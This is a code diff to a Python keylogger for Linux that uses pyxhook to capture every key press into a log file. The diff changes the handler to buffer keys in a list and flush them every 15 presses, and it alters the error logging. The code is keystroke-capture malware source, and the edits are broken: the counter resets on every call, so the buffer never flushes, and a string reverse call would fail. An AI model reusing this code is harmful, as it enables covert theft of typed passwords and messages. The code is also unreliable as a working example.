@@ -2,6 +2,7 @@
 # to be used in linux 
 import os 
 import pyxhook 
+rev=[];
   
 # This tells the keylogger where the log file will go. 
 # You can set the file path as an environment variable ('pylogger_file'), 
@@ -28,8 +29,16 @@ if os.environ.get('pylogger_clean', None) is not None:
   
 #creating key pressing event and saving it into log file 
 def OnKeyPress(event): 
-    with open(log_file, 'a') as f: 
-        f.write('{}\n'.format(event.Key)) 
+	count=0;
+	
+	rev.append(event.Key)
+	count=count+1;
+	if count==15:
+	    with open(log_file, 'a') as f: 
+	        f.write('{}\n'.format(rev))
+	    
+
+
   
 # create a hook manager object 
 new_hook = pyxhook.HookManager() 
@@ -46,4 +55,5 @@ except Exception as ex:
     msg = 'Error while catching events:\n  {}'.format(ex) 
     pyxhook.print_err(msg) 
     with open(log_file, 'a') as f: 
-        f.write('\n{}'.format(msg)) 
+        f.write('\n{}'.format(msg.reverse())) 
+        
